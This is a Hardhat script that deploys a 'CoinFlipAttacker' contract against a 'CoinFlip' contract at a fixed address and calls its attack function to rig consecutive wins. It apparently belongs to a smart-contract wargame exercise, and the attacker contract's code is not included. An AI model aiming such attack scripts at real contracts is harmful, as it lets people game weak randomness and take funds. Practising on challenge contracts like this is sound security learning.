import { ethers } from "hardhat";

async function main() {
  const [deployer] = await ethers.getSigners();

  console.log("Deploying contracts with the account:", deployer.address);

  console.log("Account balance:", (await deployer.getBalance()).toString());

  // We get the contract to deploy
  const CoinFlip = await ethers.getContractFactory("CoinFlip");
  const CoinFlipAttacker = await ethers.getContractFactory("CoinFlipAttacker");
  const coinflip = await CoinFlip.attach('0x0d7668590894F88f16a2c87D20a8C61557165235');
  const coinflipattacker = await CoinFlipAttacker.deploy("0x0d7668590894F88f16a2c87D20a8C61557165235");

  await coinflip.deployed();
  await coinflipattacker.deployed();

  console.log("CoinFlip attached at:", coinflip.address);
  console.log("CoinFlipAttacker deployed to:", coinflipattacker.address);

  await coinflipattacker.attack();  // Need to call ten times for now
  console.log('consecutive wins = ', await coinflip.consecutiveWins());
  // Should avoid redeploying, I think
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
